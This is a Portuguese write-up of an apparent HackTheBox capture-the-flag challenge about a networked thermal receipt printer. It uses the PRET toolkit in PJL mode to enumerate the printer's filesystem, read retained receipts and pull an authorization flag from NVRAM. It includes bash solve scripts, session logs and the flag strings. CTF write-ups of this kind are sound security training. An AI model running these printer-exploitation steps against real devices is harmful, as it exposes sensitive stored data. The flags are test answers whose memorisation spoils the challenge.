# Thermal Receipt 
## Resolvido Por Cesar B

Dispositivo identificado: RiverGate RG-T80II Thermal Receipt Printer

O endereço IP:PORT muda sempre que a instância é reiniciada. Substitua todos os exemplos pelo endereço ativo mostrado pelo HTB.

### Descrição original

#### Keir and his undercity runners recovered a forgotten Eastreach ration kiosk after Damas Marrowcairn sent clerks to strip the counting terminal and burn the paper ledger. They missed the networked thermal receipt printer bolted beneath the counter. This is a printer challenge, not a kiosk or web-application challenge: the exposed service speaks a raw printer protocol, so PRET in PJL mode is the intended starting point. If the printer still remembers the right transaction, it may hold the authorization token needed to move supplies through Crownspire sealed checkpoints.

### Tradução

#### Keir e seus mensageiros da cidade subterrânea recuperaram um antigo quiosque de distribuição de rações de Eastreach, depois que Damas Marrowcairn enviou funcionários para remover o terminal de contagem e queimar o livro-caixa em papel.

- Entretanto, eles esqueceram a impressora térmica de recibos conectada à rede e instalada embaixo do balcão.

- Este é um desafio de impressora, não de aplicação web ou do quiosque. O serviço exposto utiliza um protocolo bruto de impressão, e o ponto de partida pretendido é o PRET em modo PJL.

- Caso a impressora ainda se lembre da transação correta, ela poderá conter o token de autorização necessário para transportar suprimentos pelos checkpoints selados de Crownspire.

### Objetivo

- Conectar ao serviço bruto de impressão, enumerar o armazenamento interno, localizar o último recibo fechado e utilizar a referência presente nele para ler o código de autorização armazenado na NVRAM.

```
1. Preparação do PRET

Clone o repositório:

cd ~/Desktop/CTF
git clone https://github.com/RUB-NDS/PRET.git
cd PRET

Caso necessário, instale as dependências:

python3 -m venv .venv
source .venv/bin/activate
pip install colorama pysnmp

Em versões recentes do Python, podem aparecer avisos como:

SyntaxWarning: invalid escape sequence

Esses avisos não impediram a conexão nem a exploração do desafio.
```

```
2. Verificação da porta

Considere o endereço ativo fornecido pelo HTB:

IP:PORT

Teste a conexão TCP:

nc -vz IP PORT

Exemplo:

nc -vz 154.57.164.82 30885

Se aparecer Connection refused, a instância pode ter expirado. Reinicie o Docker do desafio e utilize o novo endereço.
```

```
3. Conexão com PRET em modo PJL

Entre no diretório do PRET:

cd /home/t0x1n/Desktop/CTF/PRET

Conecte ao alvo:

python3 pret.py IP:PORT pjl

Exemplo da instância em que a flag foi recuperada:

python3 pret.py 154.57.164.82:30885 pjl

Resposta:

Connection to 154.57.164.82:30885 established
Device:   RiverGate RG-T80II Thermal Receipt Printer

Welcome to the pret shell. Type help or ? to list commands.
154.57.164.82:30885:/>

Isso confirma que o serviço é uma impressora térmica RiverGate e que aceita comandos PJL por meio do PRET.
```

```
4. Enumeração inicial

Identifique o dispositivo:

id

Resultado:

RiverGate RG-T80II Thermal Receipt Printer

Verifique o diretório atual:

pwd

Resultado:

0:/

Liste a raiz:

ls

Resultado:

d        -   config
d        -   journal
-       97   readme.txt
d        -   spool

Verifique o volume da impressora:

info filesys

Resultado:

VOLUME TYPE TOTAL FREE LOCATION
0: TYPE=DIR TOTAL=65536 FREE=49152 LOCATION=FLASH

A impressora possui um volume interno em memória flash identificado como 0:.
```

```
5. Enumeração recursiva

Liste todos os arquivos:

find

Resultado:

/config/
/config/device.txt
/journal/
/journal/last.txt
/journal/receipt_0000.txt
/journal/receipt_0001.txt
/journal/receipt_0002.txt
/journal/receipt_0003.txt
/readme.txt
/spool/
/spool/README.txt

O diretório mais importante é journal/, pois armazena os recibos retidos pela impressora.
```

```
6. Análise dos arquivos informativos

Leia o arquivo da raiz:

cat readme.txt

Resultado:

RiverGate RG-T80II raw printer volume.
Electronic journal retention is enabled under 0:/journal.

Isso confirma que o diário eletrônico está habilitado em 0:/journal.

Leia a configuração:

cat config/device.txt

Resultado:

MODEL=RG-T80II
FW=3.18
CMDSET=PJL/PCL/ESC-POS
EJOURNAL=ON
LAST_CLOSED_SLOT=NVRAM:EJ_LAST

Informações relevantes:

o equipamento aceita PJL, PCL e ESC/POS;

o diário eletrônico está ativado;

a referência do último recibo fechado está relacionada à NVRAM.

Leia a informação do spool:

cat spool/README.txt

Resultado:

Active jobs are removed after cut. Closed receipts are retained in 0:/journal.

Os trabalhos ativos são removidos após o corte do papel, porém os recibos fechados continuam salvos em journal/.
```

```
7. Identificação do último recibo

Leia o ponteiro para o último recibo fechado:

cat journal/last.txt

Resultado:

receipt_0003.txt

Portanto, o último recibo é:

journal/receipt_0003.txt
```
```
8. Leitura dos recibos

Os recibos anteriores contêm códigos comuns.

Recibo 0000

cat journal/receipt_0000.txt

EASTREACH RATION KIOSK
------------------------------
DATE: 2026-05-31 22:10:04
GATE: RIVER-02
CARGO: LAMP OIL
SEAL FEE: 18.50
AUTH CODE: RG-5812-OK
------------------------------

Recibo 0001

cat journal/receipt_0001.txt

EASTREACH RATION KIOSK
------------------------------
DATE: 2026-05-31 22:44:19
GATE: MARKET-01
CARGO: MEDICINE
SEAL FEE: 07.20
AUTH CODE: RG-4421-OK
------------------------------

Recibo 0002

cat journal/receipt_0002.txt

EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:03:51
GATE: HARBOR-04
CARGO: GRAIN SACKS
SEAL FEE: 31.90
AUTH CODE: RG-9014-OK
------------------------------

Recibo 0003

cat journal/receipt_0003.txt

Resultado:

EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:17:33
GATE: ASH-03
CARGO: BRINE FILTERS
SEAL FEE: 42.10
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
------------------------------

Diferentemente dos recibos anteriores, o último não mostra o código diretamente. Ele fornece uma referência para a NVRAM:

NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60

Dados obtidos:

Referência: EJ_AUTH_0421

Endereço: 53264

Comprimento: 60 bytes
```

```
9. Recuperação da flag na NVRAM

Ainda dentro da sessão do PRET, execute:

nvram read 53264

Na instância válida, a resposta foi:

ADDRESS=53264 DATA=72
ASCII="HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}"

A sequência ASCII retornada contém diretamente a flag.
```

```
Flag

HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}
```

```
10. Comando direto com saída visível

Depois de confirmar o recibo e o endereço, é possível enviar os comandos automaticamente.

Use o endereço ativo da instância:

TARGET='IP:PORT'

printf 'cat journal/receipt_0003.txt\nnvram read 53264\nexit\n' \
  | python3 pret.py "$TARGET" pjl 2>&1 \
  | tr -d '\000' \
  | tee pret.log

Em seguida, extraia a flag:

grep -aoE 'HTB\{[^}]+\}' pret.log

O uso de tee pret.log é importante porque mantém a saída completa visível. Assim, erros de conexão, DATA=0 e outros problemas não ficam escondidos pelo grep.
```

```
11. Por que o comando anterior não mostrou nada

O comando anterior utilizava:

printf 'nvram read 53264\nexit\n' \
  | python3 pret.py "$TARGET" pjl 2>/dev/null \
  | grep -aoE 'HTB\{[^}]+\}'

Existem três situações em que ele termina sem imprimir nada:

a conexão falha e o erro é escondido por 2>/dev/null;

o PRET conecta, mas a NVRAM responde DATA=0;

a resposta não contém o padrão HTB{...}, então o grep não encontra correspondência.

Em uma instância reiniciada, a resposta observada foi:

ADDRESS=53264 DATA=0

Nesse caso, o grep estava funcionando corretamente. Não havia uma flag na resposta para ele extrair.

O recibo ainda apontava para ADDR=53264, mas a NVRAM daquela instância retornou zero. A causa exata não foi confirmada; pode ser uma instância sem o estado esperado ou uma inicialização incorreta do serviço. A ação prática é reiniciar a instância e repetir a leitura.

Não é correto afirmar, sem nova confirmação, que o problema ocorre necessariamente por abrir conexões diferentes. O comportamento comprovado é apenas que uma instância retornou a flag e outra retornou DATA=0 no mesmo endereço.
```

```
12. Script final com diagnóstico



O script abaixo:

recebe IP:PORT;

lê journal/last.txt;

identifica o último recibo;

extrai ADDR e LEN;

relê o recibo e a NVRAM na mesma conexão;

remove bytes nulos da saída;

extrai a flag com grep;

informa claramente quando a NVRAM responde DATA=0.

Criação do script

cat > solve.sh <<'EOF'
#!/usr/bin/env bash

set -uo pipefail
export LC_ALL=C

TARGET="${1:-}"
PRET="/home/t0x1n/Desktop/CTF/PRET/pret.py"

if [[ -z "$TARGET" ]]; then
    echo "Uso: $0 IP:PORT"
    exit 1
fi

if [[ ! "$TARGET" =~ ^[^:]+:[0-9]+$ ]]; then
    echo "[-] Alvo inválido. Use IP:PORT."
    exit 1
fi

if [[ ! -f "$PRET" ]]; then
    echo "[-] PRET não encontrado em: $PRET"
    exit 1
fi

run_pret() {
    printf '%s\n' "$@" 'exit' \
        | timeout 25s python3 "$PRET" "$TARGET" pjl 2>&1 \
        | tr -d '\000'
}

echo "[*] Alvo: $TARGET"
echo "[*] Identificando o último recibo..."

LAST_OUTPUT="$(run_pret 'cat journal/last.txt')"

echo "$LAST_OUTPUT" | grep -E 'Connection to|Device:|receipt_[0-9]+\.txt' || true

if grep -qiE 'connection refused|timed out|no route|failed to connect' <<< "$LAST_OUTPUT"; then
    echo "[-] Falha de conexão. Reinicie ou verifique a instância."
    exit 1
fi

RECEIPT="$(
    grep -aoE 'receipt_[0-9]+\.txt' <<< "$LAST_OUTPUT" \
        | tail -n1
)"

if [[ -z "$RECEIPT" ]]; then
    echo "[-] Não foi possível identificar o último recibo."
    echo "$LAST_OUTPUT"
    exit 1
fi

echo "[+] Último recibo: $RECEIPT"
echo "[*] Lendo journal/$RECEIPT..."

RECEIPT_OUTPUT="$(run_pret "cat journal/$RECEIPT")"

echo "$RECEIPT_OUTPUT" \
    | grep -E 'DATE:|GATE:|CARGO:|AUTH CODE:|NVRAM REF:' || true

FLAG="$(
    grep -aoE 'HTB\{[^}]+\}' <<< "$RECEIPT_OUTPUT" \
        | head -n1 || true
)"

if [[ -n "$FLAG" ]]; then
    echo
    echo "[+] Flag encontrada no recibo:"
    echo "$FLAG"
    exit 0
fi

ADDR="$(
    grep -aoE 'ADDR=[0-9]+' <<< "$RECEIPT_OUTPUT" \
        | tail -n1 \
        | cut -d= -f2
)"

LEN="$(
    grep -aoE 'LEN=[0-9]+' <<< "$RECEIPT_OUTPUT" \
        | tail -n1 \
        | cut -d= -f2
)"

if [[ -z "$ADDR" ]]; then
    echo "[-] Nenhum endereço NVRAM foi encontrado no recibo."
    exit 1
fi

echo "[+] Endereço NVRAM: $ADDR"
[[ -n "$LEN" ]] && echo "[+] Comprimento indicado: $LEN bytes"
echo "[*] Relendo o recibo e a NVRAM na mesma conexão..."

NVRAM_OUTPUT="$(
    run_pret \
        "cat journal/$RECEIPT" \
        "nvram read $ADDR"
)"

echo "$NVRAM_OUTPUT" | grep -E 'ADDRESS=|ASCII=' || true

FLAG="$(
    grep -aoE 'HTB\{[^}]+\}' <<< "$NVRAM_OUTPUT" \
        | head -n1 || true
)"

if [[ -n "$FLAG" ]]; then
    echo
    echo "[+] Flag encontrada:"
    echo "$FLAG"
    exit 0
fi

if grep -qE "ADDRESS=$ADDR DATA=0([^0-9]|$)" <<< "$NVRAM_OUTPUT"; then
    echo
    echo "[-] A NVRAM respondeu DATA=0 no endereço $ADDR."
    echo "[*] O grep está correto; esta resposta não contém uma flag."
    echo "[*] Reinicie a instância e execute o script novamente."
    exit 2
fi

echo

echo "[-] Nenhuma flag foi encontrada. Resposta completa:"
echo "$NVRAM_OUTPUT"
exit 1
EOF

chmod +x solve.sh

Execução

./solve.sh IP:PORT

Exemplo:

./solve.sh 154.57.164.82:30885

Saída esperada em uma instância válida

[*] Alvo: 154.57.164.82:30885
[*] Identificando o último recibo...
[+] Último recibo: receipt_0003.txt
[*] Lendo journal/receipt_0003.txt...
DATE: 2026-06-01 00:17:33
GATE: ASH-03
CARGO: BRINE FILTERS
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
[+] Endereço NVRAM: 53264
[+] Comprimento indicado: 60 bytes
[*] Relendo o recibo e a NVRAM na mesma conexão...
ADDRESS=53264 DATA=72
ASCII="HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}"

[+] Flag encontrada:
HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}

Saída quando a instância retorna zero

ADDRESS=53264 DATA=0

[-] A NVRAM respondeu DATA=0 no endereço 53264.
[*] O grep está correto; esta resposta não contém uma flag.
[*] Reinicie a instância e execute o script novamente.

13. Aviso sobre bytes nulos

Durante a captura da saída, o Bash mostrou:

warning: command substitution: ignored null byte in input

O PRET pode incluir bytes NUL na resposta. Por isso, o script utiliza:

tr -d '\000'

Isso remove os bytes nulos antes de armazenar a resposta em uma variável Bash.
```

```
14. Erro do nvram dump no Python 3.13

O comando:

nvram dump

produziu o erro:

TypeError: a bytes-like object is required, not 'str'

O PRET tentou escrever uma str em um arquivo aberto em modo binário. Como resultado, foi criado um arquivo vazio em nvram/.

Por isso, estes comandos não encontraram nada:

strings -a nvram/* | grep -oE 'HTB\{[^}]+\}'

grep -aEo 'HTB\{[^}]+\}' nvram/*

A resolução não depende de nvram dump; nvram read <ADDR> já retorna o conteúdo necessário quando a instância está correta.

Correção opcional do PRET

Faça backup:

cd /home/t0x1n/Desktop/CTF/PRET
cp helper.py helper.py.bak

No arquivo helper.py, antes de f.write(data), converta strings para bytes:

if isinstance(data, str):
    data = data.encode()

f.write(data)

Essa alteração é opcional e não é necessária para obter a flag.
```

```
15. Fluxo final da exploração

Conectar ao serviço com PRET em modo PJL.

Enumerar o volume interno com ls, info filesys e find.

Confirmar que os recibos são retidos em 0:/journal.

Ler journal/last.txt.

Abrir journal/receipt_0003.txt.

Identificar ADDR=53264 e LEN=60.

Executar nvram read 53264.

Extrair HTB{...} da linha ASCII=.

Caso a resposta seja DATA=0, reiniciar a instância e repetir.
```

```
Conclusão

O desafio explora o fato de impressoras de rede manterem dados sensíveis em áreas pouco verificadas, como o sistema de arquivos interno, o diário eletrônico de recibos e a NVRAM.

Mesmo após a remoção do terminal do quiosque e do livro-caixa em papel, a impressora continuou armazenando os recibos finalizados. O último recibo não continha o código diretamente, mas revelou a referência EJ_AUTH_0421, o endereço 53264 e o comprimento 60.

A leitura desse endereço com o comando nvram read 53264 retornou a sequência ASCII contendo a flag. O grep serviu apenas para extrair o padrão HTB{...} da resposta; quando outra instância retornou DATA=0, a ausência de saída do grep era esperada, pois não havia flag na resposta.

Flag final

HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}
```

```                                                                                                                                                          
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/PRET]
└─$ printf 'cat journal/last.txt\ncat journal/receipt_0003.txt\nnvram read 53264\nexit\n' \
  | python3 pret.py 154.57.164.75:32626 pjl 2>&1 \
  | tee pret.log
/home/t0x1n/Desktop/CTF/PRET/pret.py:55: SyntaxWarning: invalid escape sequence '\|'
  print("  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       ")
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              
                                                                   
     (ASCII art by                                                 
     Jan Foerster)                                                 
                                                                   
Connection to 154.57.164.75:32626 established
Device:   RiverGate RG-T80II Thermal Receipt Printer

Welcome to the pret shell. Type help or ? to list commands.
154.57.164.75:32626:/> receipt_0003.txt
154.57.164.75:32626:/> EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:17:33
GATE: ASH-03
CARGO: BRINE FILTERS
SEAL FEE: 42.10
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
------------------------------
V
154.57.164.75:32626:/> ADDRESS=53264 DATA=72
ASCII="HTB{th3rm4l_j0urn4l_r3c4ll_04b2f7b772d64dd16c07f47b0dc57acb}"
154.57.164.75:32626:/> 
                                                                                                                                                             
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/PRET]
└─$ cat > solve.sh <<'EOF'
#!/usr/bin/env bash

set -uo pipefail
export LC_ALL=C

TARGET="${1:-}"
PRET="/home/t0x1n/Desktop/CTF/PRET/pret.py"

if [[ -z "$TARGET" ]]; then
    echo "Uso: $0 IP:PORT"
    exit 1
fi

if [[ ! -f "$PRET" ]]; then
    echo "[-] PRET não encontrado em: $PRET"
    exit 1
fi

TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT

echo "[*] Alvo: $TARGET"
echo "[*] Lendo o recibo e a NVRAM na mesma conexão..."

printf '%s\n' \
    'cat journal/last.txt' \
    'cat journal/receipt_0003.txt' \
    'nvram read 53264' \
    'exit' \
  | timeout 25s python3 "$PRET" "$TARGET" pjl 2>&1 \
  | tr -d '\000' \
  | tee "$TMP"

PRET_STATUS=${PIPESTATUS[1]}

echo

FLAG="$(
    grep -aoE 'HTB\{[^}]+\}' "$TMP" |
    head -n1 || true
)"

if [[ -n "$FLAG" ]]; then
    echo "[+] Flag encontrada:"
    echo "$FLAG"
    exit 0
fi

if [[ $PRET_STATUS -eq 124 ]]; then
    echo "[-] A conexão excedeu o tempo limite."
elif grep -qiE 'connection refused|timed out|no route|failed to connect' "$TMP"; then
    echo "[-] Falha de conexão. Verifique ou reinicie a instância."
elif grep -qE 'ADDRESS=53264 DATA=0([^0-9]|$)' "$TMP"; then
    echo "[-] A NVRAM continuou vazia."
    echo "[*] Teste manualmente na mesma sessão:"
    echo "    python3 pret.py $TARGET pjl"
    echo "    cat journal/receipt_0003.txt"
    echo "    nvram read 53264"
else
    echo "[-] Nenhuma flag foi encontrada."
fi

exit 1
EOF
```

```
chmod +x solve.sh
./solve.sh 154.57.164.75:32626
[*] Alvo: 154.57.164.75:32626
[*] Lendo o recibo e a NVRAM na mesma conexão...
/home/t0x1n/Desktop/CTF/PRET/pret.py:55: SyntaxWarning: invalid escape sequence '\|'
  print("  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       ")
      ________________                                             
    _/_______________/|                                            
   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> 
  |           |   ô| ||                                            
  |___________|   ô| ||                                            
  | ||/.´---.||    | ||      「 pentesting tool that made          
  |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
  |_||=L==H==||_|__|/                                              
                                                                   
     (ASCII art by                                                 
     Jan Foerster)                                                 
                                                                   
Connection to 154.57.164.75:32626 established
Device:   RiverGate RG-T80II Thermal Receipt Printer

Welcome to the pret shell. Type help or ? to list commands.
154.57.164.75:32626:/> receipt_0003.txt
154.57.164.75:32626:/> EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:17:33
GATE: ASH-03
CARGO: BRINE FILTERS
SEAL FEE: 42.10
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
------------------------------
V
154.57.164.75:32626:/> ADDRESS=53264 DATA=72
ASCII="HTB{th3rm4l_j0urn4l_r3c4ll_04b2f7b772d64dd16c07f47b0dc57acb}"
154.57.164.75:32626:/> 
```

```
[+] Flag encontrada:
HTB{th3rm4l_j0urn4l_r3c4ll_04b2f7b772d64dd16c07f47b0dc57acb}
```
                                                                    
